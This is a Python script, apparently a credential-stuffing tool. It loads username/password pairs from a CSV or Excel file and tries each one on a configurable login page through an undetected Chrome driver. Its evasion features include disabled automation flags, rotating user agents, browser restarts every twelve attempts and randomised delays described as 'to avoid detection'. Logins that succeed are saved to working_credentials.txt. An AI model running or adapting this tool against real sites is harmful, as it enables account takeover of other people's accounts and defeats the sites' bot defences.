import time
import random
import pandas as pd
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By

# ===== CONFIG =====
LOGIN_URL = "https://your_login_page/"
USERNAME_FIELD_ID = "username"
PASSWORD_FIELD_ID = "password"
LOGIN_BUTTON_ID = "loginButton"
ERROR_DIV_ID = "errorMessageDiv"

# ===== Load credential file =====
file_path = "credentials.csv"  # OR .xlsx
if file_path.endswith(".csv"):
    df = pd.read_csv(file_path)
else:
    df = pd.read_excel(file_path)

# ===== Chrome options =====
options = uc.ChromeOptions()
options.add_argument("--start-maximized")
options.add_argument("--disable-blink-features=AutomationControlled")
options.add_argument("--disable-infobars")

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]

options.add_argument(f"user-agent={random.choice(UA_LIST)}")

# ===== Start driver =====
driver = uc.Chrome(options=options)

working_accounts = []

print("Starting login attempts...\n")

# ===== Loop through accounts =====
for index, row in df.iterrows():
    username = row['username']
    password = row['password']

    # Random delays to avoid detection
    time.sleep(random.uniform(3.5, 7.0))

    # Rotate user‑agent every 12 attempts
    if index % 12 == 0:
        driver.quit()
        options = uc.ChromeOptions()
        options.add_argument("--start-maximized")
        options.add_argument(f"user-agent={random.choice(UA_LIST)}")
        driver = uc.Chrome(options=options)

    driver.get(LOGIN_URL)
    time.sleep(random.uniform(1.2, 2.5))

    driver.find_element(By.ID, USERNAME_FIELD_ID).clear()
    driver.find_element(By.ID, USERNAME_FIELD_ID).send_keys(username)

    driver.find_element(By.ID, PASSWORD_FIELD_ID).clear()
    driver.find_element(By.ID, PASSWORD_FIELD_ID).send_keys(password)

    time.sleep(random.uniform(0.6, 1.4))
    driver.find_element(By.ID, LOGIN_BUTTON_ID).click()

    time.sleep(random.uniform(4.0, 8.0))

    # ===== Check for error =====
    try:
        error_div = driver.find_element(By.ID, ERROR_DIV_ID)
        if error_div.is_displayed():
            print(f"[-] Invalid: {username}:{password}")
            continue
    except:
        print(f"[+] VALID LOGIN: {username}:{password}")
        working_accounts.append(f"{username},{password}")

# ===== Save valid accounts =====
with open("working_credentials.txt", "w") as f:
    f.write("\n".join(working_accounts))

driver.quit()

print("\n===================================")
print("   ✔ Finished Testing All Accounts")
print("   ✔ Working accounts saved to working_credentials.txt")
print("===================================\n")
